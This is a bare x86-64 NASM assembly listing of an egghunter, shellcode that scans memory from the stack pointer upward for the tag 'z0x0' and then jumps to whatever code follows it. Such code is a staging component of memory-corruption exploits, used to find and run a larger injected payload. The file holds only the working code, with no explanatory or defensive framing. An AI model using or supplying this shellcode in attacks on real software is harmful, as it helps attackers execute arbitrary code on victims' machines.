BITS 64
 
egg equ  'z0x0'
 
global _start
section .text
 
_start:
    push rsp                  ; load current stack pointer
    pop rcx
    add rcx, 0xff             ; we need to skip our own code
 
hunt:
    inc rcx                   ; higher addresses
    cmp dword [rcx - 4], egg
    jne hunt
 
found:
    jmp rcx
